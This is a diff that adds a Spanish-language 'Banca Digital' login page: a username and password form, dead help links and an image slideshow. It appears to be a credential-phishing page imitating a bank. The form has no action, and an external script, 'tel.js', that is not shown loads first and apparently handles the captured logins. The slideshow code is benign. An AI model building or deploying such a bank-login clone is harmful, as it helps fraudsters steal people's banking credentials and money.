@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <script type="text/javascript" src="tel.js"></script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Banca Digital</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <header>
+    <div class="container">
+      <img src="logo.png" alt="Logo">
+    </div>
+  </header>
+
+  <form id="loginForm" class="login-box">
+    
+      <div class="login-box-div">
+      <!-- Aquí va tu formulario de inicio de sesión -->
+      <div class="pre"><h1 class="title-login-box">Bienvenido a tu Banca Digital</h1></div>
+       <div class="pre"><span style="font-size: 14px;vertical-align: top;padding-top: 5px;"></span></div>
+       <div class="pre-rreo">
+       <div class="login-box-input-div"><i style="margin-right: 4px;font-family: streamline;speak: none;
+    font-style: normal;
+    font-weight: 400 !important;
+    font-variant: normal;
+    text-transform: none;
+    line-height: 1;
+    -webkit-font-smoothing: antialiased;;vertical-align: top;display: inline-block;color: #c3932f;font-size: 24px;margin-top: 9px" class="stream-SV-Usuario"></i><input required="" id="username" class="login-box-input" type="text" placeholder="Ingrese su usuario"></div>
+      <div class="login-box-input-div">
+      <i style="margin-right: 4px;font-family: streamline;speak: none;
+    font-style: normal;
+    font-weight: 400 !important;
+    font-variant: normal;
+    text-transform: none;
+    line-height: 1;
+    -webkit-font-smoothing: antialiased;;vertical-align: top;display: inline-block;color: #c3932f;font-size: 24px;margin-top: 9px" class="stream-SV-Contrasena"></i><input required="" id="password" type="password" class="login-box-input" placeholder="Ingrese su contraseña"></div>
+      <div class="teclado-virtual" align="right" style="padding: 4px 83px 0 42px;"><a style="box-sizing: border-box;color: #2580b0;font-size: 12px;display: inline-block;cursor: pointer;">Teclado Virtual</a></div>
+      <div class="button-div"><button type="submit" class="button-big">Siguiente</button></div>
+      <div style="clear: both;"></div>
+      <div class="panel-usuario">
+<div style="padding-bottom: 8px;padding-top: 0;border-top: 0;width: calc(100% - 36px);text-align: right;float: right;" bis_skin_checked="1">
+<ul style="padding: 0;list-style: none;margin: 0;">
+
+<li style="display: inline-block;">
+<a class="panel-usuario-texto">
+¿Ha olvidado su contraseña?
+</a>
+</li>
+
+<li style="color: #6d6e6b;font-size: 14px;display: inline-block;margin-left: 3px;margin-right: 3px;vertical-align: middle;">|</li>
+
+<li style="display: inline-block;">
+<a class="panel-usuario-texto">
+¿Su usuario ha sido bloqueado?
+</a>
+</li>
+</ul>
+</div>
+<div style="width: calc(100% - 36px);border-top: 1px solid #e1e1e1;padding: 8px 0 0;text-align: right;float: right;padding-top: 2px;" bis_skin_checked="1">
+<ul style="padding: 0;list-style: none;margin: 0;">
+<span style="color: black" class="panel-usuario-texto">¿No tienes usuario?:</span>
+<li style="display: inline-block;">
+<a class="panel-usuario-texto">
+Regístrate aquí
+</a>
+</li>
+<li style="color: #6d6e6b;font-size: 14px;display: inline-block;margin-left: 3px;margin-right: 3px;vertical-align: middle;">|</li>
+<li style="display: inline-block;">
+<a class="panel-usuario-texto">
+¿Ha olvidado su usuario?
+</a>
+</li>
+</ul>
+
+</div>
+
+</div></div>
+
+</div>
+
+     </div>
+
+    </div>
+
+  </div>
+  <div class="additional-div">
+
+  <div class="slideshow-container">
+
+    <div class="slide fade">
+
+      <img src="bba47ab8adef5a1f8b0ff87b8fdc25f9.png" alt="Imagen 1">
+    </div>
+    <div class="slide fade">
+      <img src="dc6ab192799d4766111348cb15b7ed7d.jpg" alt="Imagen 2">
+    </div>
+     <div class="slide fade">
+      <img src="63821a5273f84a17d1103ac89d574d1a.png" alt="Imagen 3">
+    </div>
+    <div class="slide fade">
+      <img src="0857c4600950c77b9dd410ee528c2094.png" alt="Imagen 4">
+    </div>
+     <div class="slide fade">
+      <img src="58fc2e419732323e56f08cd36bb43188.jpg" alt="Imagen 5">
+    </div>
+    <div class="slide fade">
+      <img src="4c14a1e045a72928ea0ae51ad1c8d1a1.jpg" alt="Imagen 6">
+    </div>
+
+    <!-- Agrega más slides según sea necesario -->
+
+  </div>
+
+   <div style="text-align:center">
+    <!-- Puntos para seleccionar las fotos -->
+      <span class="dot"></span>
+      <span class="dot"></span>
+      <span class="dot"></span>
+      <span class="dot"></span>
+      <span class="dot"></span>
+      <span class="dot"></span>
+      <!-- Agrega más puntos según sea necesario -->
+    </div>
+</div>
+
+<script type="text/javascript">
+var slideIndex = 1;
+var intervalID; // Variable para almacenar el ID del temporizador
+
+showSlides(slideIndex);
+
+// Función para avanzar o retroceder las diapositivas
+function plusSlides(n) {
+  clearInterval(intervalID); // Detener el temporizador cuando el usuario interactúa
+  showSlides(slideIndex += n);
+}
+
+// Función para seleccionar una diapositiva específica
+function currentSlide(n) {
+  clearInterval(intervalID); // Detener el temporizador cuando el usuario interactúa
+  showSlides(slideIndex = n);
+}
+
+// Función para mostrar las diapositivas
+function showSlides(n) {
+  var i;
+  var slides = document.getElementsByClassName("slide");
+  var dots = document.getElementsByClassName("dot");
+
+  // Manejar el caso cuando llegamos al final de las diapositivas
+  if (n > slides.length) {
+    slideIndex = 1;
+  }
+  if (n < 1) {
+    slideIndex = slides.length;
+  }
+
+  // Ocultar todas las diapositivas y desactivar todos los puntos
+  for (i = 0; i < slides.length; i++) {
+    slides[i].style.display = "none";
+  }
+  for (i = 0; i < dots.length; i++) {
+    dots[i].className = dots[i].className.replace(" active", "");
+  }
+
+  // Mostrar la diapositiva actual y activar su punto correspondiente
+  slides[slideIndex - 1].style.display = "block";
+  dots[slideIndex - 1].className += " active";
+
+  // Iniciar el temporizador nuevamente después de 10 segundos de inactividad
+  clearInterval(intervalID); // Limpiar cualquier temporizador existente
+  intervalID = setInterval(function() {
+    plusSlides(1);
+  }, 5000); // Cambiar la imagen cada 5 segundos
+}
+
+// Iniciar el temporizador inicialmente
+intervalID = setInterval(function() {
+  plusSlides(1);
+}, 5000); // Cambiar la imagen cada 5 segundos
+
+</script>
+</form>
+  
+</body>
+</html>
